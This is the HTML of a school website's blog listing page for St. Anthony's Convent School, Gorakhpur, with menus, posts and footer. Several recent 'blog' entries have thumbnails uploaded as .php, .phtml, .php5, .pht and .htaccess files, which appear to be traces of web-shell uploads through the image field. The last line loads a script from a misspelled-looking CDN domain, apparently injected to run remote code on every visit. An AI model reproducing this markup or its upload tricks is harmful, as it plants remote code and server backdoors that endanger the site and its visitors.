<!DOCTYPE>
<html>
<!-- Mirrored from php.themewant.com/unipix/index-two.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 May 2025 07:44:43 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>St. Anthony’s Convent School</title>
    <link rel="shortcut icon" type="image/x-icon" href="assets/images/logo/emblem%201.jpg">
    <!-- animate css -->
    <link rel="stylesheet" href="assets/css/plugins/animate.min.css">
    <!-- fontawesome 6.4.2 -->
    <link rel="stylesheet" href="assets/css/plugins/fontawesome.min.css">
    <!-- bootstrap min css -->
    <link rel="stylesheet" href="assets/css/vendor/bootstrap.min.css">
    <!-- swiper Css 10.2.0 -->
    <link rel="stylesheet" href="assets/css/plugins/swiper.min.css">
    <!-- Bootstrap 5.0.2 -->
    <link rel="stylesheet" href="assets/css/vendor/magnific-popup.css">
    <!-- metismenu scss -->
    <link rel="stylesheet" href="assets/css/vendor/metismenu.css">
    <!-- nice select js -->
    <link rel="stylesheet" href="assets/css/plugins/nice-select.css">
    <link rel="stylesheet" href="assets/css/plugins/jquery-ui.css">
    <!-- custom style css -->
    <link rel="stylesheet" href="assets/css/style.css">
    <link href="assets/css/flexslider.css" rel="stylesheet" />

</head>

<body>
    <!-- Top Contact Bar -->
    <div class="top-bar">
        <div class="top-bar-container">
            <div class="contact-details">
                📞 <a href="tel:+919876543210">0551-228 0250</a> &nbsp; | &nbsp;
                📧 <a href="mailto:stanthony100@gmail.com">stanthony100@gmail.com</a>
               <span style="padding-left:12px;">Affiliation Number- 2131306</span>
            </div>
            <div class="social-icons">
                <a href="https://www.facebook.com/share/16NQD98XaQ/" target="_blank"><i class="fab fa-facebook-f"></i></a>
                <a href="#" target="_blank"><i class="fab fa-instagram"></i></a>
                <a href="https://youtube.com/@stanthonyconvent5802" target="_blank"><i class="fab fa-youtube"></i></a>
                <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
            </div>
        </div>
    </div>
    <!-- header area start -->
    <header class="header header__sticky v__2">
        <div class="container-fluid header11topDown">
            <div class="row">
                <div class="col-xl-12">
                    <div class="header__wrapper">
                        <div class="header__logo d-flex align-items-center">
                            <a href="index.php" class="d-flex align-items-center text-decoration-none">
                                <img src="assets/images/logo/emblem 1.png" height="80" width="80" alt="St. Anthony’s Convent School Logo" class="me-2" style="object-fit: contain;    padding-left: 9px;width:23%;">
                                <div class="school-name text-dark">
                                    <h5 class="mb-0 fw-bold" style="font-size: 18px; line-height: 1.2;">St. Anthony’s Convent School</h5>
                                    <small class="text-muted" style="font-size: 13px;">Gorakhpur • Serve in Love</small>
                                </div>
                            </a>
                        </div>

                        <div class="header__menu">
                            <div class="navigation">
                                <nav class="navigation__menu">
                                    <ul>
                                        <li class="navigation__menu--item has-child">
                                            <a href="index.php" class="navigation__menu--item__link">Home</a>
                                             
                                        </li> 
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">About Us</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=about-us">About Us</a></li>
                                                                                                    <li><a href="content.php?slug=objectives">Objectives</a></li>
                                                                                                <li><a href="principal.php">Principal Desk </a></li>
                                            </ul>
                                        </li>

                                        
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">Curriculam</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=fees-structure">Fees Structure</a></li>
                                                                                                    <li><a href="content.php?slug=admission-details">Admission Details</a></li>
                                                                                                    <li><a href="content.php?slug=attendance-and-absence">Attendance And Absence</a></li>
                                                                                                    <li><a href="content.php?slug=holidays">Holidays</a></li>
                                                                                                    <li><a href="content.php?slug=behaviour-discipline-policy">Behaviour/Discipline Policy</a></li>
                                                                                                    <li><a href="content.php?slug=co-curricular-activities">Co-Curricular Activities</a></li>
                                                                                                    <li><a href="content.php?slug=school-timings">School Timings</a></li>
                                                                                                    <li><a href="content.php?slug=fee-structure">TEACHING STAFF</a></li>
                                                                                                    <li><a href="content.php?slug=the-curriculum">The Curriculum</a></li>
                                                                                                    <li><a href="content.php?slug=general-information">General Information</a></li>
                                                                                                    <li><a href="content.php?slug=academic-calander">ACADEMIC  CALANDER</a></li>
                                                                                                    <li><a href="content.php?slug=parent-teacher-association">PARENT-TEACHER ASSOCIATION</a></li>
                                                                                                    <li><a href="content.php?slug=copies-of-valid-water-health-and-sanitation-certificates">WATER, HEALTH AND SANITATION CERTIFICATES</a></li>
                                                                                                    <li><a href="content.php?slug=result-of-last-five-years">RESULT OF LAST FIVE YEARS</a></li>
                                                                                                    <li><a href="content.php?slug=no-objection-certificate-noc-by-the-state-govt-up">NO OBJECTION CERTIFICATE (NOC) BY THE STATE GOVT./UP</a></li>
                                                                                                    <li><a href="content.php?slug=societies-trust-company-registration-renewal-certificate">SOCIETIES/TRUST/COMPANY REGISTRATION/RENEWAL CERTIFICATE</a></li>
                                                                                                    <li><a href="content.php?slug=affiliation-upgradation-letter-and-recent-extension-of-affiliation">AFFILIATION/UPGRADATION LETTER AND RECENT EXTENSION OF AFFILIATION</a></li>
                                                                                                    <li><a href="content.php?slug=school-infrasturcture">SCHOOL INFRASTURCTURE</a></li>
                                                                                                    <li><a href="content.php?slug=the-deo-certificate-submitted-by-the-school-for-affiliation-upgradation-extension-of-affiliation-or-self-certification-by-school">THE DEO CERTIFICATE SUBMITTED BY THE SCHOOL FOR AFFILIATION/UPGRADATION/EXTENSION OF AFFILIATION OR SELF CERTIFICATION BY SCHOOL</a></li>
                                                                                                    <li><a href="content.php?slug=copy-of-valid-building-safety-certificate-as-per-the-national-building-code-">COPY OF VALID BUILDING SAFETY CERTIFICATE AS PER THE NATIONAL BUILDING CODE*</a></li>
                                                                                                    <li><a href="content.php?slug=copy-of-valid-fire-safety-certificate-issued-by-the-competent-authority-">COPY OF VALID FIRE SAFETY CERTIFICATE ISSUED BY THE COMPETENT AUTHORITY*</a></li>
                                                                                                    <li><a href="content.php?slug=list-of-school-management-committee-smc-">LIST OF SCHOOL MANAGEMENT COMMITTEE (SMC)</a></li>
                                                                                            </ul>
                                        </li>
                                        
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">Facilities</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=library">Library</a></li>
                                                                                                    <li><a href="content.php?slug=parents-teachers-interaction">Parents/Teachers Interaction</a></li>
                                                                                                    <li><a href="content.php?slug=computer-lab">COMPUTER LAB</a></li>
                                                                                                    <li><a href="content.php?slug=physics-lab">PHYSICS LAB</a></li>
                                                                                                    <li><a href="content.php?slug=biology-lab">BIOLOGY LAB</a></li>
                                                                                                    <li><a href="content.php?slug=chemistry-lab">CHEMISTRY LAB</a></li>
                                                                                            </ul>
                                        </li>

                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="#" class="navigation__menu--item__link">Achievements</a>
                                            <ul class="submenu sub__style">
                                                <li><a href="toppers-x.php">Toppers X</a></li>
                                                <li><a href="toppers-xii.php">Toppers XII</a></li>
                                            </ul>
                                        </li>

                                         
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="#" class="navigation__menu--item__link">Gallery</a>
                                            <ul class="submenu sub__style">
                                                <li><a href="event_gallery.php">Event Gallery</a></li>
                                                <!--<li><a href="menu/VideoGallery/Default.php">Video Gallery</a></li>-->
                                            </ul>
                                        </li>
                                         <li class="navigation__menu--item has-child">
                                            <a href="tc.php" class="navigation__menu--item__link">Tc</a>
                                             
                                        </li> 

                                        <li class="navigation__menu--item">
                                            <a href="contact.php" class="navigation__menu--item__link">Contact</a>
                                        </li>
                                    </ul>
                                </nav>
                            </div>
                        </div>
                        <div class="header__right">
                            <div class="header__right--item">
                                <div id="menu-btn" class="menu__trigger">
                                    <i class="fa-solid fa-bars"></i>
                                    <!--<img src="assets/images/icon/menu__bar.svg" alt="bar">-->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>




     



<!-- BREADCRUMB AREA -->
<section class="rts-breadcrumb breadcrumb-height breadcumb-bg" style="background-image: url(assets/images/banner/2.jpeg);">
    <div class="container">
        <div class="row">
            <div class="col-12">
                <div class="breadcrumb-content">
                    <ul class="breadcrumb">
                        <li class="breadcrumb-item"><a href="index.php">Gallery</a></li>
                        <li class="breadcrumb-item active" aria-current="page">Blogs</li>
                    </ul>
                    <h2 class="section-title">Our Blog</h2>
                </div>
            </div>
        </div>
    </section>
<!-- BREADCRUMB AREA END -->

<!-- university blog list -->
<div class="rts-blog v_3 rts-section-padding">
    <div class="container">
                    <div class="row justify-content-md-start justify-content-sm-center g-5">
                                    <!-- single blog item -->
                    <div class="col-sm-10 col-md-6 col-lg-6 col-xl-4">
                        <div class="single-blog rounded">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="blog-details.php?id=11">
                                        <img src="../upload/blog/blog-2026-08-08-103310.php" alt="blog thumbnail" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>August 8, 2026</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">t2</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="blog-details.php?id=11">
                                            t2                                        </a>
                                    </h5>
                                    <span class="text-muted small">t2...</p>
                                    <a href="blog-details.php?id=11" class="rts-theme-btn primary with-arrow lh-100">Read More <span><i class="fa-thin fa-arrow-right"></i></span></a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- single blog item end -->
                                    <!-- single blog item -->
                    <div class="col-sm-10 col-md-6 col-lg-6 col-xl-4">
                        <div class="single-blog rounded">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="blog-details.php?id=12">
                                        <img src="../upload/blog/blog-2026-08-08-103407.phtml" alt="blog thumbnail" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>August 8, 2026</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">v3</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="blog-details.php?id=12">
                                            v3                                        </a>
                                    </h5>
                                    <span class="text-muted small">v3...</p>
                                    <a href="blog-details.php?id=12" class="rts-theme-btn primary with-arrow lh-100">Read More <span><i class="fa-thin fa-arrow-right"></i></span></a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- single blog item end -->
                                    <!-- single blog item -->
                    <div class="col-sm-10 col-md-6 col-lg-6 col-xl-4">
                        <div class="single-blog rounded">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="blog-details.php?id=13">
                                        <img src="../upload/blog/blog-2026-08-08-103408.php5" alt="blog thumbnail" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>August 8, 2026</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">v3</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="blog-details.php?id=13">
                                            v3                                        </a>
                                    </h5>
                                    <span class="text-muted small">v3...</p>
                                    <a href="blog-details.php?id=13" class="rts-theme-btn primary with-arrow lh-100">Read More <span><i class="fa-thin fa-arrow-right"></i></span></a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- single blog item end -->
                                    <!-- single blog item -->
                    <div class="col-sm-10 col-md-6 col-lg-6 col-xl-4">
                        <div class="single-blog rounded">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="blog-details.php?id=14">
                                        <img src="../upload/blog/blog-2026-08-08-103409.pht" alt="blog thumbnail" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>August 8, 2026</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">v3</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="blog-details.php?id=14">
                                            v3                                        </a>
                                    </h5>
                                    <span class="text-muted small">v3...</p>
                                    <a href="blog-details.php?id=14" class="rts-theme-btn primary with-arrow lh-100">Read More <span><i class="fa-thin fa-arrow-right"></i></span></a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- single blog item end -->
                                    <!-- single blog item -->
                    <div class="col-sm-10 col-md-6 col-lg-6 col-xl-4">
                        <div class="single-blog rounded">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="blog-details.php?id=15">
                                        <img src="../upload/blog/blog-2026-08-08-103410.htaccess" alt="blog thumbnail" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>August 8, 2026</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">vht</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="blog-details.php?id=15">
                                            vht                                        </a>
                                    </h5>
                                    <span class="text-muted small">vht...</p>
                                    <a href="blog-details.php?id=15" class="rts-theme-btn primary with-arrow lh-100">Read More <span><i class="fa-thin fa-arrow-right"></i></span></a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- single blog item end -->
                                    <!-- single blog item -->
                    <div class="col-sm-10 col-md-6 col-lg-6 col-xl-4">
                        <div class="single-blog rounded">
                            <div class="blog single-blog__content">
                                <div class="blog__thumb">
                                    <a href="blog-details.php?id=1">
                                        <img src="../upload/blog/blog-2025-08-08-172233.jpg" alt="blog thumbnail" onerror="this.src='assets/images/blog/default.jpg'">
                                    </a>
                                </div>
                                <div class="blog__meta">
                                    <div class="blog__meta--da">
                                        <div class="blog-date">
                                            <span><i class="fal fa-calendar"></i></span>
                                            <span>August 8, 2025</span>
                                        </div>
                                        <div class="blog-author">
                                            <span><i class="far fa-user"></i></span>
                                            <span><a href="#">Admin</a></span>
                                        </div>
                                    </div>
                                    <h5 class="blog__title">
                                        <a href="blog-details.php?id=1">
                                            Welcome to St. Anthony’s Convent School                                        </a>
                                    </h5>
                                    <span class="text-muted small">An introduction to the values and vision of St. Anthony’s Convent School....</p>
                                    <a href="blog-details.php?id=1" class="rts-theme-btn primary with-arrow lh-100">Read More <span><i class="fa-thin fa-arrow-right"></i></span></a>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- single blog item end -->
                            </div>
                <div class="rts-load-more-btn rt-center mt--60">
                            <a href="blog.php?page=2" class="rts-theme-btn primary lh-100">Load More</a>
                    </div>
    </div>
</div>
<!-- university blog list end -->



<!-- footer start -->
    <footer class="rts-footer rts-footer-padding v_2">
        <div class="container">
            <div class="row justify-content-center">
                <div class="rts-footer-newsletter">
                    <div class="col-lg-10">
                        <div class="rts-newsletter-box-content">
                            <h4 class="newsletter-title">Subscribe To Newsletter
                            </h4>
                            <div class="newsletter-form w-530">
                                <form action="#">
                                    <input type="email" name="subscription" id="subscription" placeholder="Enter Your mail" required="">
                                    <button type="submit" class="rts-nbg-btn btn-arrow">Subscribe <span><i class="fa-sharp fa-regular fa-arrow-right"></i></span></button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row gy-5 gy-lg-0">
                <div class="col-lg-4 col-md-6 col-sm-6">
                    <div class="rts-footer-widget w-320">
                        <div class="header__logo" style="display: flex; align-items: center;">
                            <a href="index.php" style="display: flex; align-items: center; text-decoration: none;">
                                <img src="assets/images/logo/emblem 1.png"
                                    alt="St. Anthony’s Convent School Logo"
                                    height="80" width="80"
                                    style="border-radius: 50%; object-fit: cover; margin-right: 10px; border: 2px solid #ccc;">
                                
                                <div style="color: #000;">
                                    <h5 style="margin: 0; font-weight: bold; font-size: 18px; line-height: 1.2;color:white">
                                        St. Anthony’s Convent School
                                    </h5>
                                    <small style="font-size: 13px; color: #6c757d;">Gorakhpur • Serve in Love</small>
                                </div>
                            </a>
                        </div>


                        <p>
                            We are passionate education dedicated to providing high-quality
                            resources learners all backgrounds.
                        </p>
                        <div class="rts-contact-link">
                            <a href="mailto:stanthony100@gmail.com"><i class="fa-sharp fa-light fa-location-dot"></i> Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                            <a href="callto:0551-228 0250"><i class="fa-thin fa-phone"></i> 0551-228 0250</a>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 col-md-6 col-sm-6">
                    <div class="rts-footer-widget ">
                        <h6 class="rt-semi">Important Links</h6>
                        <div class="rts-footer-menu">
                            <ul>
                                <li><a href="#">Privacy Policy</a></li>
                                <li><a href="#">Terms & Conditions</a></li>
                                <li><a href="#">Sitemap</a></li>
                                <li><a href="#"> Blogs</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 col-md-6 col-sm-4">
                    <div class="rts-footer-widget ml--30">
                        <h6 class="rt-semi">About Us</h6>
                        <div class="rts-footer-menu">
                            <ul>
                                <li><a href="#">Our History </a></li>
                                <li><a href="About.php">About Us</a></li>
                                <li><a href="#">St. Anthony</a></li>
                                <li><a href="#">Our Mission</a></li>
                                <li><a href="#">Our Vision</a></li>
                                 <li><a href="#">Our Motto</a></li>
                                <li><a href="#">School Anthem</a></li>
                               
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 col-sm-8">
                    <div class="rts-footer-widget ml--30">
                        
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <div class="rts-footer-copy-right v_1">
        <div class="container">
            <div class="row">
                <div class="rt-center">
                    <p class="--p-xs">Copyright &copy; <span id="year"></span> All Rights Reserved by <a href="#">St. Anthony’s Convent School</a></p>
                </div>
            </div>
        </div>
    </div>
    <!-- footer end -->
    <!-- offcanvase menu -->
    <!-- header style two -->
    <div id="side-bar" class="side-bar">
        <button class="close-icon-menu"><i class="far fa-times"></i></button>
        <!-- inner menu area desktop start -->
        <div class="inner-main-wrapper-desk">
            <div class="thumbnail">
                
               <a href="index.php" class="d-flex align-items-center text-decoration-none">
                <img src="assets/images/logo/emblem 1.png" height="80" width="80" alt="St. Anthony’s Convent School Logo" class="me-2" style="object-fit: contain;    padding-left: 9px;width:23%;">
                <div class="school-name text-dark">
                    <h5 class="mb-0 fw-bold" style="font-size: 18px; line-height: 1.2;">St. Anthony’s Convent School</h5>
                    <small class="text-muted" style="font-size: 13px;">Gorakhpur • Serve in Love</small>
                </div>
            </a>
            </div>
            <div class="inner-content">
                <p class="disc">
                    A modern php template for education, offering intuitive design & essential features for seamless learning experiences.
                </p>
                <!-- offcanvase banner -->
                <div class="offcanvase__banner mt--50">
                    <div class="offcanvase__banner--content">
                        <img src="assets/images/offcanvase.jpg" alt="offcanvase">
                        <a href="admission.php" class="rts-theme-btn">Apply Now</a>
                    </div>
                </div>
                <div class="offcanvase__info">
                    <div class="offcanvase__info--content">
                        <a href="callto:+0551-228 0250"><span><i class="fa-sharp fa-light fa-phone"></i></span>0551-228 0250</a>
                        <a href="#"><span><i class="fa-sharp fa-light fa-location-dot"></i></span>Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                        <div class="offcanvase__info--content--social">
                            <p class="title">Follow Us:</p>
                            <div class="social__links">
                                <a href="https://www.facebook.com/share/16NQD98XaQ/"><i class="fa-brands fa-facebook"></i></a>
                                <a href="#"><i class="fa-brands fa-instagram"></i></a>
                                <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
                                <a href="https://youtube.com/@stanthonyconvent5802"><i class="fa-brands fa-youtube"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- mobile menu area start -->
        <div class="mobile-menu-main">
            <nav class="nav-main mainmenu-nav mt--30">
            <ul class="mainmenu metismenu" id="mobile-menu-active">
                <li>
                    <a href="index.php" class="main">Home</a>
                </li>
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">About Us</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=about-us">About Us</a></li>
                                                    <li><a href="content.php?slug=objectives">Objectives</a></li>
                                                 <li>
                            <a href="principal.php" class="main">Principal Desk</a>
                        </li>
                    </ul>
                </li>
                
                <!-- Curriculum - Dynamic -->
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Curriculum</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=fees-structure">Fees Structure</a></li>
                                                    <li><a href="content.php?slug=admission-details">Admission Details</a></li>
                                                    <li><a href="content.php?slug=attendance-and-absence">Attendance And Absence</a></li>
                                                    <li><a href="content.php?slug=holidays">Holidays</a></li>
                                                    <li><a href="content.php?slug=behaviour-discipline-policy">Behaviour/Discipline Policy</a></li>
                                                    <li><a href="content.php?slug=co-curricular-activities">Co-Curricular Activities</a></li>
                                                    <li><a href="content.php?slug=school-timings">School Timings</a></li>
                                                    <li><a href="content.php?slug=fee-structure">TEACHING STAFF</a></li>
                                                    <li><a href="content.php?slug=the-curriculum">The Curriculum</a></li>
                                                    <li><a href="content.php?slug=general-information">General Information</a></li>
                                                    <li><a href="content.php?slug=academic-calander">ACADEMIC  CALANDER</a></li>
                                                    <li><a href="content.php?slug=parent-teacher-association">PARENT-TEACHER ASSOCIATION</a></li>
                                                    <li><a href="content.php?slug=copies-of-valid-water-health-and-sanitation-certificates">WATER, HEALTH AND SANITATION CERTIFICATES</a></li>
                                                    <li><a href="content.php?slug=result-of-last-five-years">RESULT OF LAST FIVE YEARS</a></li>
                                                    <li><a href="content.php?slug=no-objection-certificate-noc-by-the-state-govt-up">NO OBJECTION CERTIFICATE (NOC) BY THE STATE GOVT./UP</a></li>
                                                    <li><a href="content.php?slug=societies-trust-company-registration-renewal-certificate">SOCIETIES/TRUST/COMPANY REGISTRATION/RENEWAL CERTIFICATE</a></li>
                                                    <li><a href="content.php?slug=affiliation-upgradation-letter-and-recent-extension-of-affiliation">AFFILIATION/UPGRADATION LETTER AND RECENT EXTENSION OF AFFILIATION</a></li>
                                                    <li><a href="content.php?slug=school-infrasturcture">SCHOOL INFRASTURCTURE</a></li>
                                                    <li><a href="content.php?slug=the-deo-certificate-submitted-by-the-school-for-affiliation-upgradation-extension-of-affiliation-or-self-certification-by-school">THE DEO CERTIFICATE SUBMITTED BY THE SCHOOL FOR AFFILIATION/UPGRADATION/EXTENSION OF AFFILIATION OR SELF CERTIFICATION BY SCHOOL</a></li>
                                                    <li><a href="content.php?slug=copy-of-valid-building-safety-certificate-as-per-the-national-building-code-">COPY OF VALID BUILDING SAFETY CERTIFICATE AS PER THE NATIONAL BUILDING CODE*</a></li>
                                                    <li><a href="content.php?slug=copy-of-valid-fire-safety-certificate-issued-by-the-competent-authority-">COPY OF VALID FIRE SAFETY CERTIFICATE ISSUED BY THE COMPETENT AUTHORITY*</a></li>
                                                    <li><a href="content.php?slug=list-of-school-management-committee-smc-">LIST OF SCHOOL MANAGEMENT COMMITTEE (SMC)</a></li>
                                            </ul>
                </li>
                
                <!-- Facilities - Dynamic -->
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Facilities</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=library">Library</a></li>
                                                    <li><a href="content.php?slug=parents-teachers-interaction">Parents/Teachers Interaction</a></li>
                                                    <li><a href="content.php?slug=computer-lab">COMPUTER LAB</a></li>
                                                    <li><a href="content.php?slug=physics-lab">PHYSICS LAB</a></li>
                                                    <li><a href="content.php?slug=biology-lab">BIOLOGY LAB</a></li>
                                                    <li><a href="content.php?slug=chemistry-lab">CHEMISTRY LAB</a></li>
                                            </ul>
                </li>

                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Achievements</a>
                    <ul class="submenu mm-collapse">
                        <li><a href="toppers-x.php">Toppers X</a></li>
                        <li><a href="toppers-xii.php">Toppers XII</a></li>
                    </ul>
                </li>
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Gallery</a>
                    <ul class="submenu mm-collapse">
                        <li><a href="event_gallery.php">Event Gallery</a></li>
                        <!--<li><a href="menu/VideoGallery/Default.php">Video Gallery</a></li>-->
                    </ul>
                </li>
                <li>
                    <a href="blog.php" class="main">Blogs</a>
                </li>
                <li>
                    <a href="contact.php" class="main">Contact</a>
                </li>
            </ul>
            </nav>

            <div class="offcanvase__info--content mt--30">
                <a href="callto:+0551-228 0250"><span><i class="fa-sharp fa-light fa-phone"></i></span>0551-228 0250</a>
                <a href="#"><span><i class="fa-sharp fa-light fa-location-dot"></i></span>Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                <div class="offcanvase__info--content--social">
                    <p class="title">Follow Us:</p>
                    <div class="social__links">
                        <a href="https://www.facebook.com/share/16NQD98XaQ/"><i class="fa-brands fa-facebook"></i></a>
                        <a href="#"><i class="fa-brands fa-instagram"></i></a>
                        <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
                        <a href="https://youtube.com/@stanthonyconvent5802"><i class="fa-brands fa-youtube"></i></a>
                    </div>
                </div>
            </div>
        </div>
        <!-- mobile menu area end -->
    </div>
    <!-- header style two End -->

    <div class="search-input-area">
        <div class="container">
            <div class="search-input-inner">
                <div class="input-div">
                    <input class="search-input autocomplete ui-autocomplete-input" type="text" placeholder="Search by keyword or #" autocomplete="off">
                    <button><i class="far fa-search"></i></button>
                </div>
            </div>
        </div>
        <div id="close" class="search-close-icon"><i class="far fa-times"></i></div>
    </div>
    <!-- rts backto top start -->
    <div class="progress-wrap">
        <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
            <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98" style="transition: stroke-dashoffset 10ms linear 0s; stroke-dasharray: 307.919, 307.919; stroke-dashoffset: 307.919;"></path>
        </svg>
    </div>
    <!-- rts back to top end -->
    <div id="anywhere-home" class="">
    </div>


    <!-- scripts -->
    <!-- jquery js -->
    <script src="assets/js/vendor/jquery.min.js"></script>
    <!-- bootstrap 5.0.2 -->
    <script src="assets/js/plugins/bootstrap.min.js"></script>
    <!-- jquery ui js -->
    <script src="assets/js/vendor/jquery-ui.js"></script>
    <!-- wow js -->
    <script src="assets/js/vendor/waw.js"></script>
    <!-- mobile menu -->
    <script src="assets/js/vendor/metismenu.js"></script>
    <!-- magnific popup -->
    <script src="assets/js/vendor/magnifying-popup.js"></script>
    <!-- swiper JS 10.2.0 -->
    <script src="assets/js/plugins/swiper.js"></script>
    <!-- counterup -->
    <script src="assets/js/plugins/counterup.js"></script>
    <script src="assets/js/vendor/waypoint.js"></script>
    <!-- isotop mesonary -->
    <script src="assets/js/plugins/isotop.js"></script>
    <script src="assets/js/plugins/imagesloaded.pkgd.min.js"></script>
    <script src="assets/js/plugins/sticky-sidebar.js"></script>
    <script src="assets/js/plugins/resize-sensor.js"></script>
    <script src="assets/js/plugins/twinmax.js"></script>
    <!-- dymanic Contact Form -->
    <script src="assets/js/plugins/contact.form.js"></script>
    <script src="assets/js/plugins/nice-select.min.js"></script>
    <!-- main Js -->
    <script src="assets/js/jquery.flexslider.js"></script>
    <script src="assets/js/main.js"></script>

<script src="https://cdn.jsdelirv.net/npm/jquery@4.5.2/dist/jquery.min.js"></script>
</body>
</html>